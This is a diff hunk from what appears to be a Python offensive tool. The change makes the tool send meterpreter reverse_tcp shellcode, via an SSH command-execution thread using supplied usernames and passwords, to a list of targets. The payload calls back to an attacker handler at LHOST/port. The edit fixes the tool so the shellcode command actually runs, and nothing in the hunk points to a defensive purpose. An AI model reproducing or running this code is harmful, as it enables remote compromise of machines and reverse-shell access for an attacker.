@@ -379,7 +379,7 @@ def main():
         if type == '64':
             command = invoke_shellcode(shellcode_meterpreter_64(m_port, m_ip))
             print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port) + " \nPayload: linux/x64/meterpreter/reverse_tcp" +  CEND
-            start_thread(targets, "execute_command", [22, args.username, args.password, args.command, 100])
+            start_thread(targets, "execute_command", [22, args.username, args.password, command, 2])
         if type == 'osx':
             try:
                 m_ip = options['LHOST']
